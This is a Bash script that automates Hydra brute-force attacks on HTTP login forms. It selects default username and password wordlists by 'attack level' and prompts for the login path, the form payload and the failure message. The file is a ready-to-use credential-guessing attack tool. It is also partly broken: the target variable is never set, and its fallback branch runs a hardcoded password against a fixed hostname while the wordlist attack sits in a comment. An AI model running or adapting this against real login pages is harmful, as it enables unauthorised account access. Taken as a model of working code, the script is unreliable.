#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 80_HTTP - HYDRA [HOSTNAME] | THIS_FILE ${fetcher.hostname} | TRUE            |           |
# | 80_HTTP - HYDRA [IP]       | THIS_FILE ${fetcher.IP}       | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : HYDRA_WEB.sh
# | Description       : Script for conducting Hydra attacks on HTTP services.
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/HYDRA_WEB.sh
# | Author            : Jordon Archer
# | Date              : August 24, 2023
# ------------------------------------------------------------------------------

# Define color variables
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
YELLOW=$(tput setaf 3)
NC=$(tput sgr0) # No Color

# Define username and password lists
user_name_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/http_default_users.txt"
user_name_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/cirt_default_usernames.txt"
user_name_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/multiple_sources_users.txt"
user_name_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/xato_net_usernames.txt"

password_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/http_default_passwords.txt"
password_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/unix_passwords.txt"
password_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/most_used_passwords.txt"
password_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/xato_net_passwords.txt"

# Ask the user if they know the username
read -e -p "${YELLOW}Do you know the username? (y/n): ${NC}" -i "n" know_username

if [[ $know_username == "y" ]]; then
    read -e -p "${YELLOW}Enter the username: ${NC}" -i "" username
else
    username=""
fi

# Ask the user if they know the password
read -e -p "${YELLOW}Do you know the password? (y/n): ${NC}" -i "n" know_password

if [[ $know_password == "y" ]]; then
    read -e -p "${YELLOW}Enter the password: ${NC}" -i "" password
else
    password=""
fi

# Ask the user for the level of attack
read -e -p "${YELLOW}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level

case $attack_level in
    1)
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
    2)
        user_name_list=$user_name_list_2
        password_list=$password_list_2
        verbose="-v"
        ;;
    3)
        user_name_list=$user_name_list_3
        password_list=$password_list_3
        verbose="-v"
        ;;
    4)
        user_name_list=$user_name_list_4
        password_list=$password_list_4
        verbose="-v"
        ;;
    *)
        echo "Invalid attack level. Defaulting to level 1."
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
esac

# Ask the user for the path
read -e -p "${YELLOW}What is the path of the login page, for example '/login' or '/db/index.php': ${NC}" -i "/login" login_dir

# Ask the payload
read -e -p "${YELLOW}What is the payload, for example 'user=^USER&pass=^PASS^': ${NC}" -i "user=^USER^&pass=^PASS^" payload

# Ask the unsuccessful_text
read -e -p "${YELLOW}What text is displayed on an unsuccessful attempt, for example 'incorrect' or 'unsuccessful': ${NC}" -i "incorrect" unsuccessful_text

# Hydra attack based on user input

if [[ -n $username ]] && [[ -n $password ]]; then
    hydra -l $username -p $password $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
elif [[ -n $username ]]; then
    hydra -l $username -P $password_list $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
else
    # hydra -L $user_name_list -P $password_list -e n $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
    hydra -l $username -p password123 vulnerable.happycakefactory.com http-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
fi

#hydra -L $user_name_list -P $password_list -e n -m $login_dir $address http-post-form "$login_dir:$payload:$unsuccessful_text" -V -I -f



